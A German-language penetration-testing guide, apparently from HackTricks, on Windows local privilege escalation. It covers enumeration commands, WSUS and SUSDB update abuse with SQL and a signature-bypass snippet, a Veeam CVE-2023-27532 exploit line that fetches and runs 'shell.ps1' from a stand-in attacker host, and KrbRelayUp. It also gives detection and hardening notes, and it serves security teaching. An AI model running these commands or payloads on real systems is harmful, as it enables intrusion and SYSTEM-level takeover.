# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool zum Finden von Windows-Local-Privilege-Escalation-Vektoren:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

Diese Seite fasst die allgemeine Methodik zur Windows-Privilege-Escalation aus mehreren grundlegenden Anleitungen zusammen.<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> Der praktische Ablauf zur Enumeration stützt sich außerdem auf Community-Workshops und Checklisten.<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> Das historische Angriffsmaterial umfasst die DerbyCon-Präsentation zur Windows-Privilege-Escalation.<sup>[[5]](#references)</sup>

## Initiale Windows-Theorie

### Access Tokens

**Wenn du nicht weißt, was Windows-Access-Tokens sind, lies die folgende Seite, bevor du fortfährst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Weitere Informationen zu ACLs - DACLs/SACLs/ACEs findest du auf der folgenden Seite:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels in Windows sind, lies die folgende Seite, bevor du fortfährst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows-Sicherheitskontrollen

Es gibt verschiedene Dinge in Windows, die **dich daran hindern könnten, das System zu enumerieren**, Executables auszuführen oder sogar **deine Aktivitäten zu erkennen**. Du solltest die folgende **Seite lesen** und alle diese **Abwehrmechanismen enumerieren**, bevor du mit der Enumeration zur Privilege Escalation beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

Physischer Zugriff kann außerdem eine Offline-UEFI-NVRAM-Bearbeitung in eine Pre-Boot-DMA- und Windows-`SYSTEM`-Memory-Patching-Kette verwandeln:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / stille UIAccess-Erhöhung

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um ohne Abfragen High IL zu erreichen, wenn die Secure-Path-Prüfungen von AppInfo umgangen werden. Den speziellen UIAccess/Admin-Protection-Bypass-Ablauf findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Registry-Propagation für Barrierefreiheit im Secure Desktop kann für beliebige SYSTEM-Registry-Schreibzugriffe (RegPwn) missbraucht werden:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds bieten außerdem einen **SMB-LPE-Pfad über beliebige Ports**, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## Systeminformationen

### Enumeration von Versionsinformationen

Prüfe, ob die Windows-Version bekannte Schwachstellen aufweist (und kontrolliere auch die installierten Patches).

```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```

### Exploits für bestimmte Versionen

Diese [Website](https://msrc.microsoft.com/update-guide/vulnerability) ist hilfreich, um detaillierte Informationen zu Sicherheitslücken in Microsoft-Produkten zu finden. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas enthält watson)_
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) — erfasst den OS-Build, installierte Updates und ausgewählte potenziell relevante Advisories; prüfe das genaue Produkt und ersetzende Updates, bevor du ein Ergebnis als zutreffend einstufst.

Prüfe bei einem versionsspezifischen lokalen Exploit sowohl die **Architektur des laufenden Prozesses** als auch die des Betriebssystems. Auf 64-Bit-Windows unterliegt ein 32-Bit-Prozess der [WOW64-Dateisystemumleitung](https://learn.microsoft.com/en-us/windows/win32/winprog64/file-system-redirector): `%windir%\System32` verweist normalerweise auf das 32-Bit-Systemverzeichnis, während `%windir%\Sysnative` diesem Prozess Zugriff auf das native Systemverzeichnis ermöglicht. Für einen 64-Bit-Prozess ist dieser Alias nicht verfügbar. Ein OS-Build oder ein potenziell fehlendes KB-Update beweist nicht, dass ein Exploit funktioniert. Vergleiche den laufenden Build, installierte oder ersetzende Updates, die Prozessarchitektur und die Exploit-Voraussetzungen mit dem [Microsoft-Sicherheitsbulletin](https://learn.microsoft.com/en-us/security-updates/securitybulletins/2016/ms16-032) für das genaue Problem.

**Lokal anhand von Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**GitHub-Repos mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Umgebung

Sind irgendwelche Credentials/Juicy-Informationen in den Umgebungsvariablen gespeichert?

```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```

### PowerShell-Verlauf

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

### PowerShell-Transkriptdateien

Hier erfahren Sie, wie Sie dies aktivieren können: [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)

```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```

`C:\Transcripts` ist nur ein Beispiel. Die [PowerShell-Transkriptionsrichtlinie](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_group_policy_settings#turn-on-powershell-transcription) schreibt Dateien normalerweise in den Ordner „Dokumente“ jedes Benutzers. Eine `OutputDirectory`-Einstellung oder `Start-Transcript -OutputDirectory` kann die Dateien jedoch in einen gemeinsam genutzten oder versteckten Ordner umleiten. Prüfen Sie den tatsächlich verwendeten Ausgabepfad und die Dateiberechtigungen, bevor Sie ein Transkript überprüfen: Es kann Befehlsargumente und Ausgaben enthalten, darunter Zugangsdaten. Ein lesbares Transkript ist nur dann ein Hinweis, wenn sein Inhalt eine nutzbare Identität mit höheren Berechtigungen offenlegt und sich diese Identität im relevanten Kontext anmelden kann.

### PowerShell Module Logging

Details zu PowerShell-Pipelineausführungen werden aufgezeichnet, darunter ausgeführte Befehle, Befehlsaufrufe und Teile von Skripten. Es werden jedoch möglicherweise nicht alle Ausführungsdetails und Ausgabeergebnisse erfasst.

Folgen Sie zum Aktivieren den Anweisungen im Abschnitt „Transkriptdateien“ der Dokumentation und wählen Sie **„Module Logging“** statt **„Powershell Transcription“**.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```

Um die letzten 15 Ereignisse aus PowerShell-Protokollen anzuzeigen, kannst du Folgendes ausführen:

```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```

### PowerShell **Script Block Logging**

Ein vollständiger Aktivitäts- und Inhaltsdatensatz der Skriptausführung wird erfasst. Dadurch wird sichergestellt, dass jeder Codeblock während der Ausführung dokumentiert wird. Dieser Prozess bewahrt einen umfassenden Audit-Trail aller Aktivitäten, der für die Forensik und die Analyse bösartigen Verhaltens wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess ermöglicht.

```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```

Protokollierungsereignisse für den Script Block finden Sie in der Windows-Ereignisanzeige unter folgendem Pfad: **Anwendungs- und Dienstprotokolle > Microsoft > Windows > PowerShell > Operational**.\
Die letzten 20 Ereignisse können Sie mit folgendem Befehl anzeigen:

```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```

### Interneteinstellungen

```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```

### Laufwerke

```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

## WSUS

Die frühere Anleitung fasste das Risiko wie folgt zusammen:

Sie können das System kompromittieren, wenn Updates nicht über http**S**, sondern über http angefordert werden.

Ein HTTP-WSUS-Endpunkt ist ein Hinweis darauf, dass Update-Metadaten abgefangen werden könnten. Eine Ausnutzung hängt außerdem davon ab, ob der Client diesen WSUS-Server verwendet, ob ein Angreifer dessen Datenverkehr abfangen oder kontrollieren kann und welche Update-Vertrauens- und Installationsrichtlinien auf dem Client gelten. Die URL allein führt nicht zwangsläufig zur Codeausführung. [Microsoft empfiehlt TLS für WSUS-Metadaten](https://learn.microsoft.com/en-us/windows-server/administration/windows-server-update-services/deploy/2-configure-wsus).

Zuerst prüfen Sie, ob das Netzwerk WSUS-Updates ohne SSL verwendet, indem Sie Folgendes in cmd ausführen:

```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```

Oder Folgendes in PowerShell:

```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```

Wenn du eine Antwort wie eine der folgenden erhältst:

```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
      WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```
```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```

Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Die ursprüngliche Aussage zur Anwendbarkeit lautete:

Dann **ist es ausnutzbar.** Wenn der letzte Registrierungswert gleich `0` ist, wird der WSUS-Eintrag ignoriert.

Wenn `UseWUServer` den Wert `1` hat, verwendet Windows Update den konfigurierten Intranetdienst. Damit ist eine Voraussetzung für den HTTP-Interception-Pfad erfüllt. Dies beweist jedoch nicht, dass Interception, die Annahme eines schädlichen Updates oder eine Installation mit erhöhten Rechten möglich ist. Wenn der Wert `0` ist, wird dieser konkrete konfigurierte WSUS-Endpunkt von dieser Richtlinie nicht ausgewählt.

Um diese Schwachstellen auszunutzen, können Sie Tools wie [Wsuxploit](https://github.com/pimps/wsuxploit) und [pyWSUS ](https://github.com/GoSecure/pywsus) verwenden. Dabei handelt es sich um weaponized MiTM-Exploit-Skripte, mit denen sich „gefälschte“ Updates in nicht per SSL geschützten WSUS-Verkehr einschleusen lassen.

Lesen Sie die Forschung hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Den vollständigen Bericht hier lesen**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
Im Grunde nutzt dieser Bug folgende Schwachstelle aus:

> Wenn wir unseren lokalen Benutzer-Proxy ändern können und Windows Updates den in den Einstellungen von Internet Explorer konfigurierten Proxy verwendet, können wir PyWSUS lokal ausführen, um unseren eigenen Datenverkehr abzufangen und Code als Benutzer mit erhöhten Rechten auf unserem System auszuführen.
>
> Da der WSUS-Dienst außerdem die Einstellungen des aktuellen Benutzers verwendet, greift er auch auf dessen Zertifikatspeicher zu. Wenn wir ein selbstsigniertes Zertifikat für den WSUS-Hostnamen erstellen und dieses Zertifikat dem Zertifikatspeicher des aktuellen Benutzers hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Verkehr abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-first-use-Validierung des Zertifikats umzusetzen. Wenn das vorgelegte Zertifikat vom Benutzer als vertrauenswürdig eingestuft wird und den korrekten Hostnamen aufweist, wird es vom Dienst akzeptiert.

Sie können diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es veröffentlicht wurde).

### Von WSUS-Administratoren kontrollierte Updates

Ein separater Angriffsweg besteht, wenn die aktuelle Identität Updates auf einem WSUS-Server **veröffentlichen und genehmigen** kann. Prüfen Sie die effektive Mitgliedschaft in der Gruppe `WSUS Administrators` des Servers sowie delegierte WSUS-Berechtigungen und ermitteln Sie anschließend die Clientcomputergruppe, die ein genehmigtes Update erhalten würde. [Microsoft verlangt WSUS-Administratorrechte zum Genehmigen von Updates](https://learn.microsoft.com/en-us/powershell/module/updateservices/approve-wsusupdate) und [dokumentiert die Vertrauensbeziehung beim Veröffentlichen](https://learn.microsoft.com/en-us/previous-versions/windows/desktop/bb902479%28v%3Dvs.85%29): Clients müssen dem Signaturzertifikat vertrauen, das für lokal veröffentlichte Inhalte verwendet wird. Vergewissern Sie sich, dass das betreffende Update signiert und akzeptiert wird, für das Zielsystem anwendbar ist und in einem Kontext mit höheren Rechten installiert wird, bevor Sie dies als Privilege-Escalation-Angriffsweg einstufen. Ein HTTP-`WUServer`-Wert oder Gruppenname allein belegt diese Voraussetzungen nicht.

### Missbrauch benutzerdefinierter SUSDB-Updates: unsignierte Payloads über `.txt`/`.esd`

Dies ist ein anderes Versagen der Vertrauensgrenze als das Abfangen einer HTTP-WSUS-Verbindung: Voraussetzung ist ausreichender Zugriff auf die gespeicherten Prozeduren der **WSUS-Datenbank (`SUSDB`)**, um ein benutzerdefiniertes Update zu veröffentlichen und zu genehmigen. Ein möglicher Einstieg ist das Weiterleiten des Kontos eines WSUS-Upstreamcomputers an einen separaten MSSQL-Server, auf dem `SUSDB` gehostet wird. Die genauen Voraussetzungen hängen von der Bereitstellung ab. Ermitteln Sie daher zunächst die `EXECUTE`-Berechtigungen, statt SQL-Administratorrechte vorauszusetzen.<sup>[[38]](#references)[[39]](#references)</sup>

Informationen zum separaten Angriffsweg, bei dem WSUS-Clientauthentifizierung von HTTP/8530 an LDAP, SMB oder AD CS weitergeleitet wird, finden Sie unter [Missbrauch von WSUS HTTP für NTLM-Relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8).

#### Externes Datenbank-Relay und Prozedurberechtigungen überprüfen

Bei Bereitstellungen, in denen WSUS einen externen SQL Server verwendet, prüfen Sie zunächst, ob sich das WSUS-Serverkonto bei der Datenbank authentifizieren kann und ob ein NTLM-Relay den Listener erreicht. Die SQL-Rolle des Servers kann Zugriff auf Prozeduren zum Veröffentlichen von Updates gewähren, auch wenn direkte Schreibvorgänge in Tabellen verweigert werden. Ein fehlgeschlagenes `UPDATE` auf `SUSDB` belegt nicht, dass das Veröffentlichen blockiert ist. Prüfen Sie in einer autorisierten SQL-Sitzung die effektive Identität, die Rollenmitgliedschaft und die Prozedurberechtigungen, bevor Sie ein benutzerdefiniertes Update versuchen.<sup>[[38]](#references)</sup>

```sql
USE SUSDB;
SELECT ORIGINAL_LOGIN() AS LoginName, USER_NAME() AS DatabaseUser;
SELECT IS_ROLEMEMBER('webService') AS IsWebServiceRoleMember;
SELECT * FROM sys.fn_my_permissions('dbo.spImportUpdate', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSaveXmlFragment', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spSetBatchURL', 'OBJECT');
SELECT * FROM sys.fn_my_permissions('dbo.spDeployUpdate', 'OBJECT');
```

Die aktuellen Prozedurdefinitionen und die installierte `SoftwareDistributionPackage.xsd` sind hilfreich, um gültige Update-Metadaten zu rekonstruieren. Sowohl ein Bundle-Elternelement als auch ein Payload-Kindelement benötigen `UpdateIdentity` (Fragmenttyp `1`), `LocalizedProperties` (`4`) und `ExtendedProperties` (`2`). Erfasse die lokale Revisions-ID, die jeder Aufruf von `spImportUpdate` zurückgibt, und stelle sicher, dass die Bundle-Beziehung, Digests, Größe, Inhalts-URL und Revision übereinstimmen. Dies ist ein zustandsbehafteter Publishing-Workflow. Ein einzelner erfolgreicher Aufruf einer gespeicherten Prozedur beweist nicht, dass eine clientseitige Ausführung stattgefunden hat.<sup>[[38]](#references)</sup>

#### Update erstellen, Ziel festlegen und genehmigen

Der Workflow für benutzerdefinierte Updates verwendet legitime WSUS-Prozeduren als eingeschränkte Publishing-API. Die wichtigen Zustandsübergänge sind:<sup>[[38]](#references)</sup>

| Phase | Relevante gespeicherte Prozeduren |
| --- | --- |
| Update-Metadaten importieren | `spImportUpdate` |
| Voraussetzungen sowie lokalisierte und erweiterte XML-Fragmente speichern | `spSaveXMLFragment` |
| Den Inhalts-Digest mit der vom Angreifer kontrollierten URL verknüpfen | `spSetBatchURL` |
| Eine Computergruppe auflisten/erstellen und den Client hinzufügen | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| Die Installation für diese Gruppe genehmigen | `spDeployUpdate` mit `@actionID = 0` und `@isAssigned = 1` |

Dateiname, Digests, Größe und `CommandLineInstallation`-Handler müssen in den importierten Metadaten und Fragmenten übereinstimmen. Nachdem die Inhalts-URL und die Zielgruppe festgelegt wurden, sieht die abschließende Genehmigung etwa wie folgt aus. Verwende neue Update-, Gruppen- und Deployment-IDs, statt die Beispiel-GUIDs erneut zu verwenden.<sup>[[38]](#references)[[39]](#references)</sup>

```sql
EXEC spDeployUpdate
  @updateID = '<update-guid>', @revisionNumber = 1,
  @actionID = 0, @targetGroupID = '<group-guid>',
  @isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
  @adminName = 'Administrator';
```

#### Erweiterungsbasierter Signatur-Bypass

WSUS weist normalerweise beliebige, nicht signierte ausführbare Inhalte zurück. In `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` setzt der .NET-Pfad `VerifyFile` das Flag für die Zertifikatsprüfung jedoch auf false, wenn der übergebene Dateiname mit `.txt` oder `.esd` endet; `CheckCertificateSignature` wird dann übersprungen, ohne zuvor nachzuweisen, dass die Bytes Text oder ein legitimes ESD-Image sind. Daher kann eine unveränderte PE-Datei, die beispielsweise `payload.exe.txt` heißt, die Inhaltsprüfung bestehen und später vom Befehlszeilen-Installationshandler des Updates gestartet werden. Dies ist ein Richtlinien-/Typverwechslungsfehler, keine Signaturfälschung.<sup>[[39]](#references)</sup>

```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
    checkSignature = false;
if (checkSignature)
    CheckCertificateSignature(/* downloaded file */);
```

#### BITS-kompatibles Staging und Automatisierung

Ein Aufruf von `spDeployUpdate` veranlasst WSUS, den registrierten Inhalt abzurufen. Der Ursprungsserver muss die HTTP-Anforderungen von BITS erfüllen: Eine erreichbare URL allein reicht nicht aus, da die Übertragung einen anfänglichen `HEAD`-/`GET`-Ablauf und Byte-Range-Anfragen verwendet. Ein Server ohne Range-Unterstützung verursacht das WSUS-Synchronisierungsereignis `EventId=364` mit dem Hinweis, dass BITS den Range-Protokollheader benötigt.<sup>[[39]](#references)</sup>

Der Research-PoC [NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious) generiert das für die Import-/Fragment-/URL-/Gruppen-/Deployment-Kette erforderliche SQL, enthält einen modifizierten MSSQL-Client zur Ausführung und liefert `BitsWebServer.py` für das Staging von Inhalten mit. Ein minimaler Aufruf in einem autorisierten Labor lautet:<sup>[[40]](#references)</sup>

```bash
python3 NotWSUSpicious.py \
  --wsusHostname wsus.lab.local \
  --updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
  --updateName SecurityUpdate \
  --updateFilePath /payloads/payload.exe.txt \
  --updateArguments '' \
  --computerGroup TestGroup \
  --targetComputer workstation.lab.local
python3 BitsWebServer.py
```

#### Unbeaufsichtigte Ausführung und Retry-Persistenz

Die Interaktion auf Clientseite hängt von der Richtlinie ab. `Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates`, Option `4 - Auto download and schedule install`, bewirkt, dass ein genehmigtes Update heruntergeladen und nach dem konfigurierten Zeitplan installiert wird, ohne dass der Benutzer es manuell auswählen muss. Bei Tests wurde ein Payload, dessen Update fehlgeschlagen/unvollständig blieb, sofort erneut angeboten, nachdem der Callback-Prozess beendet wurde. Dadurch kann das Retry-Verhalten zu wiederkehrender Ausführung als Persistenzmechanismus werden. Das ist auffällig, weil der Client einen fehlgeschlagenen Update-Status anzeigt.<sup>[[39]](#references)</sup>

#### Erkennung und Hardening-Ansatzpunkte

Nützliche Ansatzpunkte auf Server- und Clientseite in dieser Angriffskette sind:<sup>[[39]](#references)</sup>

- Die Ausführung von `spCreateTargetGroup`, `spSetBatchURL` und `spDeployUpdate` in `SUSDB` überwachen; neue Targeting-Gruppen, externe Content-Ursprünge, `.txt`-/`.esd`-Update-Payloads und Bereitstellungen durch unerwartete Principals untersuchen (insbesondere Nicht-Computer-Konten).
- `C:\Program Files\Update Services\LogFiles` auf `ContentSyncAgent`, `FileVerified`, das falsch geschriebene `FileVerficationFailed` und `EventId=364` überprüfen; Verifizierung mit der Payload-Erweiterung und dem Content-Magic korrelieren, statt dem Suffix zu vertrauen.
- Wiederholt fehlschlagende/erneut versuchte Windows-Update-Installationen sowie PE-Ausführung oder unerwartete Child-/Netzwerkaktivität durch Content mit `.txt`- oder `.esd`-Namen aufspüren.
- Sofern unterstützt, Extended Protection for Authentication für den Datenbankdienst erzwingen und den Datenbank-Netzwerkzugriff auf den WSUS-Server und autorisierte Administrationssysteme beschränken. `EXECUTE`-Berechtigungen für die Custom-Update-Prozeduren minimieren und überwachen.

## Drittanbieter-Auto-Updater und Agent-IPC (local privesc)

Viele Enterprise-Agents stellen eine localhost-IPC-Schnittstelle und einen privilegierten Update-Kanal bereit. Wenn sich die Registrierung auf einen Angreifer-Server umleiten lässt und der Updater einer Rogue Root CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler Benutzer ein bösartiges MSI bereitstellen, das der SYSTEM-Dienst installiert. Eine verallgemeinerte Technik (basierend auf der Netskope-stAgentSvc-Angriffskette – CVE-2025-0309) ist hier beschrieben:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM über TCP 9401)

Die ursprüngliche versionsspezifische Beschreibung und der Recon-Hinweis lauteten:

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der vom Angreifer kontrollierte Nachrichten verarbeitet und dadurch beliebige Befehle als **NT AUTHORITY\SYSTEM** ermöglicht.<sup>[[12]](#references)</sup>

- **Recon**: Listener und Version überprüfen, z. B. mit `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.

Veeam Backup & Replication und Cloud Connect verwenden standardmäßig einen zentralen Backup-Dienst auf **TCP/9401**. [Veeams Advisory](https://www.veeam.com/kb4424) beschreibt die unauthentifizierte Offenlegung verschlüsselter Zugangsdaten der Konfigurationsdatenbank innerhalb des Backup-Netzwerkperimeters; ein separater öffentlicher PoC demonstriert einen Pfad zur Befehlsausführung als **NT AUTHORITY\SYSTEM**.<sup>[[12]](#references)</sup> Der Dienst kann auch über localhost hinaus an eine Adresse gebunden sein. Überprüfen Sie daher die tatsächliche Adresse und PID.

- **Recon**: Sicherstellen, dass TCP/9401 zu `Veeam.Backup.Service.exe` gehört, und anschließend das installierte Produkt sowie die Patch-Metadaten prüfen. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion` sind Anhaltspunkte, aber keine vollständige Patchprüfung.
- **Erste behobene Releases**: Veeam nennt **11a Build 11.0.1.1261 P20230227** und **12 Build 12.0.0.1420 P20230223** als erste behobene Releases; frühere Releases sind betroffen. Eine vierteilige Dateiversion allein kann einen ungepatchten Basis-Build nicht von einem späteren Patch mit derselben Build-Nummer unterscheiden. Prüfen Sie die Patch-Kennung anhand der [Build-Historie des Anbieters](https://www.veeam.com/kb2680), bevor Sie einen Grenz-Build als behoben einstufen.
- **Exploit**: Legen Sie einen PoC wie `VeeamHax.exe` zusammen mit den erforderlichen Veeam-DLLs im selben Verzeichnis ab und lösen Sie dann über den lokalen Socket einen SYSTEM-Payload aus:

```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```

Der Dienst führt den Befehl als SYSTEM aus.

Der zitierte PoC zeigt die Ausführung von Befehlen als SYSTEM, sofern die zusätzlichen Voraussetzungen erfüllt sind; der Sicherheitshinweis des Herstellers beschreibt das Problem der Offenlegung von Zugangsdaten.

## KrbRelayUp

Die ursprüngliche Beschreibung der Standardumgebung lautete:

Eine Schwachstelle für **local privilege escalation** besteht unter bestimmten Bedingungen in Windows-**Domänen**umgebungen. Dazu gehören Umgebungen, in denen **LDAP-Signing nicht erzwungen wird,** Benutzer über Self-Rechte verfügen, mit denen sie **Resource-Based Constrained Delegation (RBCD)** konfigurieren können, und Benutzer Computer in der Domäne erstellen können. Wichtig ist, dass diese **Voraussetzungen** bei Verwendung der **Standardeinstellungen** erfüllt sind.

Ein lokales Kerberos-Relay kann von einer Anmeldung mit geringeren Berechtigungen zu einem privilegierten Schreibzugriff auf das Verzeichnis führen, wenn sich ein geeigneter COM-Server authentifiziert und der weitergeleitete Prinzipal über Rechte am Zielobjekt verfügt. [KrbRelay dokumentiert](https://github.com/cube0x0/KrbRelay) sowohl LDAP-Schreibvorgänge für RBCD als auch für `msDS-KeyCredentialLink` (Shadow Credentials); KrbRelayUp automatisiert einige dieser Pfade. Eine RBCD-Kette erfordert passende Delegierungs- und Zielobjektrechte, während eine Shadow-Credential-Kette Schreibrechte für Schlüsselanmeldedaten und einen KDC voraussetzt, der den Zertifikatauthentifizierungspfad unterstützt. Keiner der beiden Pfade ergibt sich allein aus der Mitgliedschaft in der Domäne.

Prüfe die Richtlinien des tatsächlichen DC für [LDAP-Signing](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-signing) und [LDAPS Channel Binding](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding), die Objekt-ACL der weitergeleiteten Identität sowie die Authentifizierungs- und Identitätswechselstufen der ausgewählten COM-Klasse. Anmeldetyp und Anmeldeinformationskontext des Aufrufers sind relevant: Eine WinRM-Sitzung kann sich anders verhalten als eine interaktive Anmeldung oder eine Anmeldung mit neuen Anmeldeinformationen. Auch Firewall-/OXID-Routing und installierte Updates können das Ergebnis beeinflussen. Behandle eine freizügige Richtlinie oder eine passende ACL als Kandidaten für eine Überprüfung; passive Enumeration sollte keine COM-Coercion, Relay-Authentifizierung oder Schreibvorgänge im Verzeichnis auslösen. Ein Shadow Credential für ein Computerkonto kann zu einem Maschinenticket führen und – nur wenn dieses Konto über die erforderlichen Rechte zur Verzeichnisreplikation verfügt – zu einem separaten DCSync-Pfad.

Finde den **Exploit unter** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

